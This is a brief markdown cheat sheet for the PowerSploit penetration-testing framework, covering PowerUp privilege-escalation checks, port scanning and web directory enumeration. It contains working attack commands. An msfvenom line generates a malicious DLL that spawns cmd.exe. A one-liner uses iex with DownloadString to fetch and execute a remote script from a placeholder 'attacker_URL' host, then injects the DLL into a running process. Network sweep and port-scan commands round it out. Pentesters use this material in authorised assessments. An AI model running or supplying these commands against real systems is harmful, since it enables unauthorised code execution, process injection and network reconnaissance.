# $ powersploit
collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. 
# PowerUp module
```powershell
PS> Import-Module .\Privesc.psm1
PS> Get-Command –Module Privesc
```
## Invoke-AllChecks
Run all functions related to the Privesc module looking for misconfigurations, permissions issues with services, opportunities for DLL hijacking a number of other useful checks.
```powershell
PS> Invoke-AllChecks
PS> Invoke-AllChecks -HTMLReport
```
## Invoke-DLLInjection
```bash
msfvenom -p windows/exec CMD="cmd.exe" -f dll > cmd.dll
```
```powershell
PS C:\> iex (New-Object Net.Webclient).DownloadString("http://attacker_URL/Invoke-DLLInjection.psl"); Invoke-DLLInjection -ProcessID 7420 C:\programdata\cmd.dll
```
# Invoke-Portscan
enumerate network hosts and ports
```powershell
PS> Invoke-Portscan -Hosts "192.168.13.1/24" -PingOnly # identify live hosts
PS> Invoke-Portscan -HostFile ips.txt -PingOnly # identify live hosts from list
PS> Invoke-Portscan -HostFile ips.txt -PingOnly | Export-Csv C:\ping_scan.csv # identify live hosts from list and export to CSV
PS> Invoke-Portscan -HostFile live_hosts.txt -ports "53-81" # port scan list of hosts 
PS> Invoke-Portscan -HostFile live_hosts.txt -oG port_scan.gnmap -f -ports "53-81"   # port scan list of hosts, output in greppable format
```
# Get-HttpStatus
enumerate files and directories on webserver
```powershell
PS> Get-HttpStatus -Target 192.168.13.62 -Path dictionary.txt -Port 80 | >> ? ($_.Status -match "ok")
```